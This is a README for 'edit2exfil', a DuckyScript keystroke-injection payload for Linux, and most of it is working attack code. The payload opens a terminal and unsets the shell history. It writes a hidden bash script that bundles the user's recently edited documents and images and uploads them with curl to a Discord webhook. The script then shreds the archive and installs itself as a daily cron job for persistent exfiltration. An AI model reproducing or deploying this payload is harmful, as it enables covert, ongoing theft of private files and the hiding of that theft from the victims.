
REM TITLE: edit2exfil

REM AUTHOR: OSINTI4L (https://github.com/OSINTI4L)

REM TARGET OS: Linux (tested on Kali Linux Release 2025-W19)

REM DESCRIPTION: (See below)

REM REQUIREMENTS: Place Discord webhook in the #WEBHOOK_URL constant on line 10 | Timing of when and how frequent the script will be ran (10:00 AM, daily by default) via `cronjob` can be changed in line 53.

-----

## edit2exfil

edit2exfil is a persistent file exfiltration payload that embeds itself as a `cronjob` on Linux systems via bash script, running silently in the background allowing for persistent exfiltration of updated files.

**The payload builds a bash script (.e2e.sh) that performs multiple tasks in the following order:**

1. a `net_check` conditional statement is utilized to see if the machine has internet connectivity. This is acheived by sending a `PING` to [Hak5.org](https://hak5.org). If `PING` was **NOT** successful, the script exits and will be ran again in 24 hours by default (or the next scheduled time of your choosing). If the `PING` **WAS** successful, the script moves to a secondary conditional statement >
2. a `file_check` conditional statement is utilized to see if the following document file types have been modified (edited) in the past 24 hours in the /home directory (recursively): `.txt, .pdf, .docx, .doc, .csv, .xlsx, .png, .jpg, .jpeg, .sh`. If there are **NOT** any documents (with the previous file types) that have been modified in the past 24 hours in the /home directory (recursively), the script exits and will be ran again in 24 hours by default (or the next scheduled time of your choosing), else >
3. The files are tarballed (.loot.tar.gz) and placed (hidden) in the /home directory for exfiltration >
4. The tarball is then exfiltrated via Discord webhook >
5. The tarball is then `shredded` to obfuscate its' presence >
6. End of script.

Total time for DuckyScript payload to run: `7 seconds`.

**DuckyScript Payload Workflow:**
  1. Terminal window is opened >
  2. Terminal history is unset (to obfuscate building of the payloads' bash script (.e2e.sh) > bash script is built >
  3. Execution permissions are given to .e2e.sh > .e2e.sh is added to `cronjob` to automatically run silently in the bachkground daily at 10:00 AM >
  4. Terminal window is closed >
  5. End of payload.

**Payload Bash Script (.e2e.sh):**
```
# Creating file_check function to see if the listed filetypes (and their respective documents) have been modified (edited) in the past 24 hours:
file_check() {
    find ~ -mtime -1 -type f \( -name "*.txt" -o -name "*.pdf" -o -name "*.docx" -o -name "*.doc" -o -name "*.csv" -o -name "*.xlsx" -o -name "*.png" -o -name "*.jpg" -o -name "*.jpeg" -o -name "*.sh" \) -print0 | grep -q . 
}

# Creating hidden tarball function to tarball the listed documents (of the respective filetypes) that have been modified (edited) in the past 24 hours:
tarball() {
    find ~ -mtime -1 -type f \( -name "*.txt" -o -name "*.pdf" -o -name "*.docx" -o -name "*.doc" -o -name "*.csv" -o -name "*.xlsx" -o -name "*.png" -o -name "*.jpg" -o -name "*.jpeg" -o -name "*.sh" \) -print0 | tar -czf ~/.loot.tar.gz --null -T -
}

# Creating net_check function to check for internet connectivity by send a PING to hak5.org:
net_check() {
    ping -c 1 hak5.org
}

# Creating global $user variable:
user="$(whoami)"

# If internet connection, check for files, if files, tarball, else exit:
if net_check; then
    if file_check; then
        tarball
    else
        exit 0
    fi
else
    exit 0
fi

# Exfiltrate tarball of found files to Discord:
curl -X POST -H "Content-Type: multipart/form-data" \
-F "file=@/home/$user/.loot.tar.gz" \
-F "content=$ Loot Incoming $" \
#WEBHOOK_URL

# Shred the tarball post exfiltration to obfuscate:
shred -fuz ~/.loot.tar.gz
```

**DuckyScript Payload (building of above script):**
```
REM Place Discord webhook constant:
DEFINE #WEBHOOK_URL https://discord.com/api/webhooks/PLACE/WEBHOOK/HERE

REM Begin attack:
ATTACKMODE HID
DELAY 1000

REM Opening terminal:
CTRL ALT t
DELAY 300

REM Unsetting terminal history and building ".e2e.sh":
STRINGLN unset HISTFILE
STRINGLN cat > .e2e.sh
STRINGLN_BASH
file_check() {
    find ~ -mtime -1 -type f \( -name "*.txt" -o -name "*.pdf" -o -name "*.docx" -o -name "*.doc" -o -name "*.csv" -o -name "*.xlsx" -o -name "*.png" -o -name "*.jpg" -o -name "*.jpeg" -o -name "*.sh" \) -print0 | grep -q . 
}
tarball() {
    find ~ -mtime -1 -type f \( -name "*.txt" -o -name "*.pdf" -o -name "*.docx" -o -name "*.doc" -o -name "*.csv" -o -name "*.xlsx" -o -name "*.png" -o -name "*.jpg" -o -name "*.jpeg" -o -name "*.sh" \) -print0 | tar -czf ~/.loot.tar.gz --null -T -
}
net_check() {
    ping -c 1 hak5.org
}
user="$(whoami)"

if net_check; then
    if file_check; then
        tarball
    else
        exit 0
    fi
else
    exit 0
fi
curl -X POST -H "Content-Type: multipart/form-data" \
-F "file=@/home/$user/.loot.tar.gz" \
-F "content=$ Loot Incoming $" \
#WEBHOOK_URL
shred -fuz ~/.loot.tar.gz
END_STRINGLN
CTRL c

REM Granting execution permissions and adding ".e2e.sh" to cronjob to be executed at 10:00 AM, daily:
STRINGLN chmod +x .e2e.sh; crontab -l > e2etemp; echo "0 10 * * * ~/.e2e.sh" >> e2etemp; crontab e2etemp; shred -fuz e2etemp; exit
```
